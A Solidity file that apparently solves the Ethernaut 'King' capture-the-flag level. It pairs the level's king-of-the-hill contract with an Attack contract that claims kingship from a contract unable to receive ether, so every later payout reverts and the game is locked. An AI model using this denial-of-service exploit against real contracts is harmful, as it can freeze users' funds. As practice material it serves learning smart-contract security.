//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  //contract.prize().then(v => v.toString())
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract Attack{
    address _addr = 0x4d9d2A1A4492F2510f0F4C64D567036F17263e17;

    function claimKingship() public payable {
        (bool sent, ) = payable(_addr).call{value: msg.value}("");
        require(sent, "didn't send");
    }
}